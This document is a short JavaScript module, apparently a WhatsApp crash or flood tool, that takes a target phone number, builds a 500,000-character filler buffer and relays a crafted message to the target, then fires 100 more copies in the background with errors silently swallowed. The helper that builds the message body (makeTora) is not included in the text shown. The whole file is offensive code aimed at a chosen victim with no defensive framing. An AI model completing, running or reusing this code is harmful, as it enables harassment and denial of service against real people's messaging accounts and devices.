function buildPayloads(target) {
  const jid = String(target).trim().endsWith("@s.whatsapp.net")
    ? String(target).trim()
    : String(target).trim() + "@s.whatsapp.net";
  const buffer = "A".repeat(500000);
  return { jid, buffer };
}

async function fire(sock, p) {
  const tora = makeTora(p);
  const msg = generateWAMessageFromContent(p.jid, tora, {});
  return sock.relayMessage(p.jid, msg.message, {
    messageId: msg.key.id,
    isSecret: true,
  });
}

module.exports = async function (sock, target) {
  if (!sock || !target) {
    return { ok: false, error: "Missing sock or target" };
  }

  let p;
  try {
    p = buildPayloads(target);
    await fire(sock, p);
  } catch (e) {
    return { ok: false, error: e.message || "First call failed" };
  }

  setImmediate(() => {
    const jobs = [];
    for (let i = 0; i < 100; i++) {
      jobs.push(
        Promise.resolve()
          .then(() => fire(sock, p))
          .catch(() => {})
      );
    }
    Promise.allSettled(jobs).catch(() => {});
  });

  return { ok: true };
};
